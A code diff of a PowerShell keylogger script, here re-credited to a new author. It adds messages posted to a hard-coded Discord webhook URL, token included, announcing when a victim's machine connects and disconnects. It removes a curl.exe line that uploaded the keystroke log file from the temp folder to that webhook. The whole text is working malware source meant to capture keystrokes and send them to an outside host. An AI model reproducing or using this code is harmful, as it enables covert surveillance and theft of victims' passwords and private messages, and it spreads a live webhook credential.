@@ -1,9 +1,19 @@
 # powershell keylogger
-# created by : C0SM0
-
+# created by : Henry
 
 # keylogger
-
+$online = @"
+Connected to a device !!!!
+"@
+$offline = @"
+Disconnected to the device !!!!
+"@
+$payload = [PSCustomObject]@{
+    content = $online
+}
+$close = [PSCustomObject]@{
+  content = $offline
+}
 $link = "https://discord.com/api/webhooks/1182206285043728434/wNxaBaI78nxyhnhFcDgM1sSNnaYV0S0ECCjHGTHPCl4PMrbVUyiVoqlYfUNSTij5Bxrc"
 $done = $true
 $logTimes = @(
@@ -39,6 +49,7 @@ $logTimes = @(
 # sort the times in chronological order
 $logTimes = $logTimes | Sort-Object
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
+  Invoke-RestMethod -ContentType 'Application/Json' -Uri $link -Method Post -Body ($payload | ConvertTo-Json)
   
   # generate log file
   $generateLog = New-Item -Path $logFile -ItemType File -Force
@@ -109,7 +120,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     
   }
   finally{
-    Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:temp/$env:UserName.log```" $link"
+    Invoke-RestMethod -ContentType 'Application/Json' -Uri $link -Method Post -Body ($close | ConvertTo-Json)
   }
 
 }
